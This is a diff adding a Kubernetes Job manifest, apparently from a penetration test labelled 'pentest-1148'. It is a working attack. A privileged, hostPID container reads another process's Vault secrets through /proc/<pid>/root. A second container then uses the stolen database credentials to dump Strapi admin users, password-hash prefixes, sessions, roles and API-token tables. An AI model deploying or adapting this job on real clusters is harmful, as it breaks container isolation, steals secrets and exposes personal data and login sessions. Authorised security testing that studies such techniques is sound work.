@@ -1,0 +1,71 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: dbq2
+  namespace: pentest-1148
+  labels:
+    purpose: pentest-1148
+spec:
+  backoffLimit: 0
+  ttlSecondsAfterFinished: 86400
+  template:
+    metadata:
+      labels:
+        purpose: pentest-1148
+    spec:
+      serviceAccountName: probe
+      restartPolicy: Never
+      nodeName: anubis-gateway-chatly-3akkk1
+      hostPID: true
+      volumes:
+      - name: shared
+        emptyDir: {}
+      containers:
+      - name: reader
+        image: busybox:1.36
+        securityContext:
+          privileged: true
+          runAsUser: 0
+        volumeMounts:
+        - name: shared
+          mountPath: /shared
+        command: ["/bin/sh","-c"]
+        args:
+        - |
+          for p in /proc/[0-9]*; do
+            cmd=$(tr '\0' ' ' < $p/cmdline 2>/dev/null)
+            case "$cmd" in
+              *strapi.js*start*)
+                cat $p/root/vault/secrets/config > /shared/config.env 2>/dev/null
+                echo "reader: pid ${p#/proc/}" > /shared/reader.log
+                break
+                ;;
+            esac
+          done
+          sleep 150
+      - name: psql
+        image: postgres:16-alpine
+        volumeMounts:
+        - name: shared
+          mountPath: /shared
+        command: ["/bin/sh","-c"]
+        args:
+        - |
+          for i in $(seq 1 90); do [ -s /shared/config.env ] && break; sleep 2; done
+          cat /shared/reader.log
+          . /shared/config.env
+          export PGPASSWORD="$DATABASE_PASSWORD" PGHOST="$DATABASE_HOST" PGPORT="$DATABASE_PORT" PGDATABASE="$DATABASE_NAME" PGUSER="$DATABASE_USERNAME" PGSSLMODE=require
+          echo "##COLS"
+          psql -Atc "select table_name||'.'||column_name||'|'||data_type||'|null='||is_nullable||'|def='||coalesce(column_default,'-') from information_schema.columns where table_schema='public' and table_name in ('admin_users','admin_users_roles_lnk','strapi_sessions','admin_roles','strapi_api_tokens','up_users','up_roles','strapi_api_token_permissions') order by table_name, ordinal_position" 2>&1
+          echo "##COUNTS"
+          psql -Atc "select 'up_users='||count(*) from up_users" 2>&1
+          psql -Atc "select 'admin_users_roles_lnk='||count(*) from admin_users_roles_lnk" 2>&1
+          psql -Atc "select 'strapi_sessions='||count(*) from strapi_sessions" 2>&1
+          psql -Atc "select 'api_tokens='||count(*) from strapi_api_tokens" 2>&1
+          echo "##ADMINROW"
+          psql -Atc "select id||'|'||firstname||'|'||lastname||'|'||email||'|'||left(password,7)||'...|'||is_active||'|'||blocked||'|'||prefered_language||'|'||created_at from admin_users order by id limit 10" 2>&1
+          echo "##LNKROW"
+          psql -Atc "select * from admin_users_roles_lnk order by 1 limit 20" 2>&1
+          echo "##SESSROW"
+          psql -Atc "select * from strapi_sessions order by 1 limit 3" 2>&1
+          echo "##DONE"
